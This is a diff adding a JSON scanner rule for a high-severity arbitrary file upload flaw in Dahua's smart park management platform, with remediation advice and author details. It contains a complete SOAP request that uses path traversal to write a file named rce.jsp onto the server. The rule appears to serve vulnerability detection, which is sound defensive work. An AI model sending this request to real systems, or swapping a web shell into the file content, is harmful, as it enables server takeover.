@@ -1,0 +1,24 @@
+{
+    "vul_name": "大华智慧园区综合管理平台 gis/soap/bitmap接口处任意文件上传漏洞",
+    "level": "高危",
+    "description": "大华园区综合管理平台/emap/webservice/gis/soap/bitmap接口处存在任意文件上传漏洞，恶意攻击者可能会上传后门文件，造成服务器失陷",
+    "product": "大华 智慧园区综合管理平台",
+    "version": "大华智慧园区综合管理平台",
+    "cve": "无",
+    "reference": "https://mp.weixin.qq.com/s/OkZk0F9-uNQ1qekE7f-FUg",
+    "fixing": "联系厂商修复，设置安全设备的访问策略或者设置白名单",
+    "rule": {
+        "path": "/emap/webservice/gis/soap/bitmap",
+        "method": "POST",
+        "headers": "Content-Type: text/xml; charset=utf-8\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
+        "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:res=\"http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/\">\r\n    <soapenv:Header/>           \r\n      <soapenv:Body>\r\n             <res:uploadPicFile>\r\n                    <arg0>\r\n                   <picPath>/../rce.jsp</picPath>\r\n                    </arg0>\r\n                    <arg1>dGVzdA==</arg1>\r\n                </res:uploadPicFile>\r\n    </soapenv:Body>\r\n</soapenv:Envelope>",
+        "status_code": "200",
+        "keywords": "soap;upload",
+        "res_time": ""
+    },
+    "operator": {
+        "author": "浪飒",
+        "email": "langsa-hy@qq.com",
+        "github": "https://github.com/langsasec"
+    }
+}
